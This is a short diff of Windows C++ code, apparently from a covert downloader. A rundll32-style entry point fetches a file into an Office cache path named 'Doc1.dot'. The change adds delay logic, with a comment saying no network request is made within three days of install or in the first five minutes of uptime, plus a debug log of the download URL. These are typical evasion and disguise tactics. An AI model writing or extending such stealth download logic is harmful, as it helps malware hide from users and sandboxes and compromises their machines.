@@ -309,7 +309,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 	PathAppend(szPath, _T("Content.mso\\Doc1.dot"));	
 	
 	DWORD dwOffset = (DWORD)time(0) - dwInstallTime;
-	if((0 != dwInstallTime) && (3*24*60*60 < dwOffset) && PathFileExists(szPath))
+	if( ( (3*24*60*60 > dwOffset) || GetTickCount()<5*60*1000) && PathFileExists(szPath)) //三天内不产生网络请求
 	{
 		hr = S_OK;
 	}
@@ -320,6 +320,7 @@ void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
 		//wcscpy(szTempPath, szPath);
 		//PathAppend(szTempPath, _T("..\\..\\Doc1.dot"));
 		//DeleteFile(szTempPath);
+		TSDEBUG4CXX("downloadurl : "<<szDestLaunch<<" to " <<szPath<<" return " <<hr);
 	}
 	//wcscpy(szPath, L"c:\\scripthost.js");
 	if(!PathFileExists(szPath))
